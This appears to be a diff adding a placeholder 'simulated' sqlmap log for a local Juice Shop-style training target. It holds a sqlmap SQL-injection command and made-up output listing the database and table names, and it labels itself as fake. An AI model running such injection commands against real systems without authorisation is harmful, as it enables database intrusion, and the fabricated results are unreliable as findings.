@@ -1,0 +1,7 @@
+[SIMULATED LOG] sqlmap -u "http://localhost:3000/rest/products?q=1" -p q --batch
+[INFO] testing connection to the target URL
+[INFO] testing for SQL injection on parameter: q
+[CRITICAL] parameter 'q' appears to be injectable (boolean-based)
+[INFO] fetching database names: juice_shop_db
+[INFO] tables: users, products, orders
+[WARNING] THIS IS A SIMULATED LOG FILE — replace with your real sqlmap_output.log
